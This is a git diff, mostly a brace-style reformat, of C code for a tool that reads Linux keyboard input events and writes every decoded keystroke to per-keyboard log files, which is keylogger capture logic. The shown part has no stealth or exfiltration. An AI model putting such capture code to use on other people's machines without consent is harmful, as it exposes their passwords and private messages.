@@ -29,28 +29,31 @@ struct kb_worker_cleanup_infos {
     int    reset;
 };
 
-static void killed_worker(void *arg) {
+static void killed_worker(void *arg)
+{
     // Cleanup handler.
     struct kb_worker_cleanup_infos *cleanup_infos = (struct kb_worker_cleanup_infos *) arg;
     // Close the open device files.
     if (cleanup_infos->device_file_fd != -1) close(cleanup_infos->device_file_fd);
     // Set worker state.
-    if (cleanup_infos->reset) {
+    if (cleanup_infos->reset)
+    {
         cleanup_infos->kb_worker->kb_status = KB_WORKER_RESET;
         make_terminal_log(RESETTING, cleanup_infos->kb_worker->kb_id);
     }
-    else {
+    else
+    {
         cleanup_infos->kb_worker->kb_status = KB_WORKER_FAILED;
         make_terminal_log(DISCONNECTED, cleanup_infos->kb_worker->kb_id);
     }
 }
 
-_Noreturn void *start_worker(void *worker) {
+__attribute__((noreturn)) void *start_worker(void *worker)
+{
     struct kb_worker_cleanup_infos cleanup_infos;
     struct kb_worker *worker_infos = (struct kb_worker *) worker;
     struct input_event device_event; // Current keyboard device event.
     struct kb_dec_key *decoded;
-    size_t keystroke_buffer_s = 1;
     char *device_event_path;
     ALLOC_MEM(device_event_path, strlen(worker_infos->kb_event_file) + 1, sizeof(char));
     pthread_cleanup_push(killed_worker, (void *) &cleanup_infos);
@@ -58,7 +61,8 @@ _Noreturn void *start_worker(void *worker) {
 
     int device_fd = open(device_event_path, O_RDONLY);
     free(device_event_path);
-    if (device_fd == -1) {
+    if (device_fd == -1)
+    {
         make_terminal_log(FAILED_TO_OPEN, worker_infos->kb_id);
         cleanup_infos.kb_worker = worker_infos;
         cleanup_infos.device_file_fd = -1;
@@ -72,7 +76,8 @@ _Noreturn void *start_worker(void *worker) {
 
     make_terminal_log(START_CAPTURE, worker_infos->kb_id);
     while (TRUE) {
-        if (read(device_fd, &device_event, sizeof(device_event)) == -1) {
+        if (read(device_fd, &device_event, sizeof(device_event)) == -1)
+        {
             make_terminal_log(FAILED_TO_READ, worker_infos->kb_id);
             cleanup_infos.reset = DONT_RESET;
             pthread_exit(0);
@@ -81,13 +86,15 @@ _Noreturn void *start_worker(void *worker) {
         if (worker_infos->kb_status == KB_WORKER_INITIAL) create_log_file(worker_infos->kb_id);
         if (worker_infos->kb_status != KB_WORKER_RUNNING) worker_infos->kb_status = KB_WORKER_RUNNING;
 
-        if (device_event.type == 1 && device_event.value == 1) {
+        if (device_event.type == 1 && device_event.value == 1)
+        {
             decoded = decode(device_event.code);
             if (decoded == NULL) continue;
             make_keystroke_log(decoded->kb_key_name, worker_infos->kb_id);
             append_to_file(decoded->kb_key_name, worker_infos->kb_id);
 
-            if (decoded->kb_key_code == KEY_ENTER) {
+            if (decoded->kb_key_code == KEY_ENTER)
+            {
                 // Save the contents of the buffer.
                 append_to_file("\n", worker_infos->kb_id);
             }
